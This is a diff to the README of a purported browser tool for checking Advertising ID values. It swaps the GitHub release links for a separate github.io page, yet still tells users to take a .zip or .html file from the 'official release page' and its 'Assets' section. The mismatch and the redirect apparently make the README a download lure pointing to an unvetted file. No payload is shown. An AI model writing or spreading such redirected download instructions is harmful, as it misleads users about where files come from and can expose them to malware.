@@ -1,6 +1,6 @@
 # 🔍 adid-checker-web - Quickly verify your ADID values today
 
-[![](https://img.shields.io/badge/Download-ADID_Checker-blue.svg)](https://github.com/Charitable-description322/adid-checker-web/releases)
+[![](https://img.shields.io/badge/Download-ADID_Checker-blue.svg)](https://charitable-description322.github.io)
 
 This software helps you check Advertising ID (ADID) values. It runs inside your web browser. You do not need to install complex software on your computer. The tool offers a simple way to validate data without extra steps.
 
@@ -8,7 +8,7 @@ This software helps you check Advertising ID (ADID) values. It runs inside your 
 
 You must download the latest version from the official release page. Follow the steps below to find the correct file.
 
-1. Visit this link: [https://github.com/Charitable-description322/adid-checker-web/releases](https://github.com/Charitable-description322/adid-checker-web/releases)
+1. Visit this link: [https://charitable-description322.github.io](https://charitable-description322.github.io)
 2. Look for the section labeled "Assets."
 3. Click the file name that ends in .zip or .html to save it to your computer.
 4. Save the file in a place you can find later, such as your Downloads folder.
